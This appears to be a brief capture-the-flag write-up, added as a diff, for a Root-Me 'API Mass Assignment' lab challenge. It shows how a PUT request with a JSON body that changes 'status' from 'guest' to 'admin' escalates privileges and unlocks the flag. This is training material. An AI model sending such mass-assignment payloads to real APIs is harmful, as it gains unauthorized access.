@@ -1,0 +1,32 @@
+Challenge : API Mass Assignment
+Site : http://challenge01.root-me.org:59090/
+
+1: I'm tested /api/signup & /api/login but no distinction found on that. But i test /api/user/ found json data :
+
+json data :
+{
+  "note": "",
+  "status": "guest",
+  "userid": 4,
+  "username": "black"
+}
+json data :
+
+2. So, i'm trying to change the "status": "guest" to "admin". I'm intercept the request from Burpsuite, send to "Repeater" and changed
+the HTTP method to "PUT", add "Content-Type: application/json" and insert the json data on request body :
+
+json data :
+{
+  "note": "",
+  "status": "admin",
+  "userid": 4,
+  "username": "black"
+}
+json data:
+
+3. Send the request and the response json data :
+json data :
+{"message":"User updated sucessfully."}
+json data :
+
+4. Now, i got the flag via /api/flag.
